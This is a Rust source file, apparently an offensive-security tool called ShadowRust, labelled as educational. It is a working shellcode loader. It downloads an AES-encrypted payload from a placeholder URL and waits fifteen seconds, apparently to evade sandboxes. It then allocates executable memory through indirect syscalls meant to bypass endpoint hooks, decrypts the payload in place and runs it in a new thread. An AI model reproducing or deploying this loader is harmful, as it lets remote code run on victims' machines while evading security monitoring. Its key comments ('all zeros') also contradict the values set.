/*
 * Author: Cyb3rV1c
 * Created: 2025
 * License: MIT License
 * This code was written by Cyb3rV1c and is a work in progress for cybersecurity
 * educational purposes.
 */
extern crate winapi;
use std::ptr;
use std::error::Error;
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use std::fs::File;
use std::io::{self, Read};
use std::mem::zeroed;
use std::ptr::{null, null_mut};
use std::thread;
use std::time::Duration;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{PCWSTR, NTSTATUS};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::wininet::{
    InternetOpenW, InternetOpenUrlW, InternetReadFile, InternetSetOptionW,
    INTERNET_FLAG_HYPERLINK, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
    INTERNET_OPTION_SETTINGS_CHANGED,
};
use winapi::um::handleapi::CloseHandle;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::winnt::{HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

// Define the type for AES-256 CBC mode
type Aes256Cbc = Cbc<Aes256, Pkcs7>;

fn decrypt_data(data: &mut [u8], key: &[u8], iv: &[u8]) -> Result<usize, Box<dyn Error>> {
    // Initialize the AES-256 cipher in CBC mode
    let cipher = Aes256Cbc::new_from_slices(&key, &iv)
        .map_err(|e| format!("[!] Error initializing cipher: {:?}", e))?;
    
    // Decrypt the data into a new Vec
    let decrypted_data = cipher.decrypt_vec(data)
        .map_err(|e| format!("[!] Error decrypting data: {:?}", e))?;
    
    let decrypted_len = decrypted_data.len();
    if decrypted_len > data.len() {
        return Err("[!] Decrypted data length exceeds allocated memory".into());
    }
    // Copy the decrypted data back into the allocated memory (in-place decryption)
    data[..decrypted_len].copy_from_slice(&decrypted_data);
    Ok(decrypted_len)
}

//Retrieve Data from external url

fn fetch_file_from_urlw(file_download_url: PCWSTR) -> Result<Vec<u8>, String> {
    unsafe {
        let mut internet = std::mem::zeroed::<Internet>();
        internet.h_internet = InternetOpenW(null(), 0x00, null(), null(), 0x00);
        if internet.h_internet.is_null() {
            return Err(format!("[!] InternetOpenW Failed With Error: {}", GetLastError()));
        }

        internet.h_internet_file = InternetOpenUrlW(
            internet.h_internet, 
            file_download_url, 
            null(), 
            0, 
            INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 
            0x00
        );
        if internet.h_internet_file.is_null() {
            return Err(format!("[!] InternetOpenUrlW Failed With Error: {}", GetLastError()));
        }

        let mut file_data = Vec::new();
        internet.read_to_end(&mut file_data).map_err(|e| e.to_string())?;

        Ok(file_data)
    }
}

struct Internet {
    h_internet: HANDLE,
    h_internet_file: HANDLE,
}

impl Read for Internet {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        let mut bytes_read = 0;

        unsafe {
            if InternetReadFile(
                self.h_internet_file,
                buf.as_mut_ptr() as _,
                buf.len() as u32,
                &mut bytes_read,
            ) == 0
            {
                return Err(std::io::Error::last_os_error());
            }
        }

        Ok(bytes_read as usize)
    }
}

impl Drop for Internet {
    fn drop(&mut self) {
        if !self.h_internet.is_null() {
            unsafe { CloseHandle(self.h_internet) };
            unsafe { InternetSetOptionW(null_mut(), INTERNET_OPTION_SETTINGS_CHANGED, null_mut(), 0) };
        }
        if !self.h_internet_file.is_null() {
            unsafe { CloseHandle(self.h_internet_file) };
        }
    }
}

//Indirect-SysCalls Execution 

// External syscall functions from the `.asm` file
extern "C" {
    fn NtAllocateVirtualMemory(
        process_handle: HANDLE,
        base_address: *mut *mut c_void,
        zero_bits: u64,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> u32;

    fn NtWriteVirtualMemory(
        process_handle: HANDLE,
        base_address: *mut c_void,
        buffer: *const c_void,
        buffer_size: usize,
        bytes_written: *mut usize,
    ) -> u32;

    fn NtCreateThreadEx(
        thread_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: HANDLE,
        start_address: *const c_void,
        parameter: *mut c_void,
        create_flags: u32,
        stack_zero_bits: usize,
        size_of_stack_commit: usize,
        size_of_stack_reserve: usize,
        bytes_buffer: *mut c_void,
    ) -> u32;

    fn NtWaitForSingleObject(
        handle: HANDLE,
        alertable: u8,
        timeout: *const i64,
    ) -> u32;
}

// Global variables for syscall numbers and addresses
#[no_mangle]
static mut wNtAllocateVirtualMemory: u32 = 0;
#[no_mangle]
static mut sysAddrNtAllocateVirtualMemory: usize = 0;

#[no_mangle]
static mut wNtWriteVirtualMemory: u32 = 0;
#[no_mangle]
static mut sysAddrNtWriteVirtualMemory: usize = 0;

#[no_mangle]
static mut wNtCreateThreadEx: u32 = 0;
#[no_mangle]
static mut sysAddrNtCreateThreadEx: usize = 0;

#[no_mangle]
static mut wNtWaitForSingleObject: u32 = 0;
#[no_mangle]
static mut sysAddrNtWaitForSingleObject: usize = 0;

// Function to populate syscall numbers and addresses
unsafe fn get_syscall_addresses() {
    let h_ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const i8);
    if h_ntdll.is_null() {
        panic!("[!] Failed to load ntdll.dll");
    }

    let p_nt_allocate_virtual_memory = GetProcAddress(h_ntdll, "NtAllocateVirtualMemory\0".as_ptr() as *const i8);
    if p_nt_allocate_virtual_memory.is_null() {
        panic!("[!] Failed to get NtAllocateVirtualMemory address");
    }
    wNtAllocateVirtualMemory = *(p_nt_allocate_virtual_memory as *const u8).add(4) as u32;
    sysAddrNtAllocateVirtualMemory = p_nt_allocate_virtual_memory as usize + 0x12;

    let p_nt_write_virtual_memory = GetProcAddress(h_ntdll, "NtWriteVirtualMemory\0".as_ptr() as *const i8);
    if p_nt_write_virtual_memory.is_null() {
        panic!("[!] Failed to get NtWriteVirtualMemory address");
    }
    wNtWriteVirtualMemory = *(p_nt_write_virtual_memory as *const u8).add(4) as u32;
    sysAddrNtWriteVirtualMemory = p_nt_write_virtual_memory as usize + 0x12;

    let p_nt_create_thread_ex = GetProcAddress(h_ntdll, "NtCreateThreadEx\0".as_ptr() as *const i8);
    if p_nt_create_thread_ex.is_null() {
        panic!("[!] Failed to get NtCreateThreadEx address");
    }
    wNtCreateThreadEx = *(p_nt_create_thread_ex as *const u8).add(4) as u32;
    sysAddrNtCreateThreadEx = p_nt_create_thread_ex as usize + 0x12;

    let p_nt_wait_for_single_object = GetProcAddress(h_ntdll, "NtWaitForSingleObject\0".as_ptr() as *const i8);
    if p_nt_wait_for_single_object.is_null() {
        panic!("[!] Failed to get NtWaitForSingleObject address");
    }
    wNtWaitForSingleObject = *(p_nt_wait_for_single_object as *const u8).add(4) as u32;
    sysAddrNtWaitForSingleObject = p_nt_wait_for_single_object as usize + 0x12;
}

unsafe fn load_data_from_file(file_path: &str) -> io::Result<Vec<u8>> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(buffer)
}

fn to_wide_string(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn main() {
       const ShadowRust: &str = r#"
░██████╗██╗░░██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗  ██████╗░██╗░░░██╗░██████╗████████╗
██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║  ██╔══██╗██║░░░██║██╔════╝╚══██╔══╝
╚█████╗░███████║███████║██║░░██║██║░░██║░╚██╗████╗██╔╝  ██████╔╝██║░░░██║╚█████╗░░░░██║░░░
░╚═══██╗██╔══██║██╔══██║██║░░██║██║░░██║░░████╔═████║░  ██╔══██╗██║░░░██║░╚═══██╗░░░██║░░░
██████╔╝██║░░██║██║░░██║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░  ██║░░██║╚██████╔╝██████╔╝░░░██║░░░
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░  ╚═╝░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░
"#;
   println!("{}", ShadowRust);
    unsafe {
        // Initialize syscall numbers and addresses
        get_syscall_addresses();

        // Fetch Data from URL
        let file_download_url = to_wide_string("http://yourdomain.com"); // Change URL to the actual data location
        let data = match fetch_file_from_urlw(file_download_url.as_ptr()) {
            Ok(data) => {
                println!("[+] Data retrieved successfully. Size: {} bytes", data.len());
                data
            },
            Err(e) => {
                println!("[!] Failed to download file: {}", e);
                return;
            }
        };

        // Adding a delay after downloading the file
        println!("[i] Delaying execution for 15 seconds...");
        std::thread::sleep(std::time::Duration::from_secs(15)); // Delay execution for 15 seconds
        println!("[i] Resuming execution...");

        // Allocate memory for data
        let mut alloc_buffer: *mut c_void = std::ptr::null_mut();
        let mut region_size: usize = data.len();

        println!("[i] Attempting memory allocation");
        let status = NtAllocateVirtualMemory(
            GetCurrentProcess(),
            &mut alloc_buffer,
            0,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        );

        if status != 0 {
            panic!("[!] NtAllocateVirtualMemory failed with status: 0x{:x}", status);
        }
        println!("[+] Memory allocated at: {:?}", alloc_buffer);

        println!("[i] Writing data to allocated memory");
        let mut bytes_written: usize = 0;
        let status = NtWriteVirtualMemory(
            GetCurrentProcess(),
            alloc_buffer,
            data.as_ptr() as *const _,
            data.len(),
            &mut bytes_written,
        );

        if status != 0 {
            panic!("[!] NtWriteVirtualMemory failed with status: 0x{:x}", status);
        }
        println!("[+] Data written successfully.");

          // --- Decryption Section ---
        // Define your AES key and IV.
        // IMPORTANT: Replace these example values with the ones used during encryption.
        let key: [u8; 32] = [0xAB; 32]; // Example: all zeros (use your actual 32-byte key)
        let iv: [u8; 16] = [0x12; 16];   // Example: all zeros (use your actual 16-byte IV)

        println!("[i] Decrypting the AES encrypted data");
        // Create a mutable slice from the allocated memory
        let data_slice = std::slice::from_raw_parts_mut(alloc_buffer as *mut u8, data.len());
        match decrypt_data(data_slice, &key, &iv) {
            Ok(decrypted_len) => {
                println!("[+] Data decrypted successfully. Decrypted length: {} bytes", decrypted_len);
            },
            Err(e) => {
                panic!("[!] Data decryption failed: {}", e);
            }
        }
        // --- End of Decryption Section ---

        // Create a thread to execute the data code
        let mut thread_handle: HANDLE = std::ptr::null_mut();
        println!("[i] Creating a thread to execute Data");
        let status = NtCreateThreadEx(
            &mut thread_handle,
            0x1FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            GetCurrentProcess(),
            alloc_buffer,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );

        if status != 0 {
            panic!("[!] NtCreateThreadEx failed with status: 0x{:x}", status);
        }
        println!("[+] Thread created with handle: {:?}", thread_handle);

        // Wait for the thread to complete execution
        println!("[i] Waiting for the thread to finish execution");
        let status = NtWaitForSingleObject(thread_handle, 0, std::ptr::null());

        if status != 0 {
            panic!("[!] NtWaitForSingleObject failed with status: 0x{:x}", status);
        }
        println!("[+] Data executed successfully");
    }
}
